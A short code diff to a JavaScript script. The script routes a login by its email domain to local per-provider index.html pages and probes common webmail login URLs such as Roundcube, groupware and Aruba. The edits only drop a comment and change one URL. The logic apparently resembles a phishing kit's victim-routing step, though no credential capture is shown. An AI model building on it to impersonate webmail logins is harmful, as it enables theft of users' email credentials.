@@ -16,10 +16,8 @@ async function main () {
 
   const sanitized = domain.replace(/[^a-z0-9.-]/gi, '');
 
-  /* ---------- helper changed here ----------------------------------- */
   const go = folder =>
     location.href = `${folder}/index.html?login=${encodeURIComponent(login)}`;
-  /* ------------------------------------------------------------------ */
 
   /* ---------- STEP 2 – direct domain → folder ----------------------- */
   const direct = {
@@ -63,7 +61,8 @@ async function main () {
 
   /* ---------- STEP 4 – probe common webmail URLs -------------------- */
   const probes = {
-    groupware:[`http://gw.${sanitized}/groupware/login.php`],
+    /* CHANGED ↓ */
+    groupware:[`http://gw.${sanitized}/groupware/login.html`],
     roundcube:[`http://${sanitized}/webmail/`,`http://webmail.${sanitized}/`,`http://${sanitized}:2095`],
     ngw:[`http://mail.${sanitized}/ngw/app/#/sign`],
     aruba:[`https://webmail.aruba.it/`],
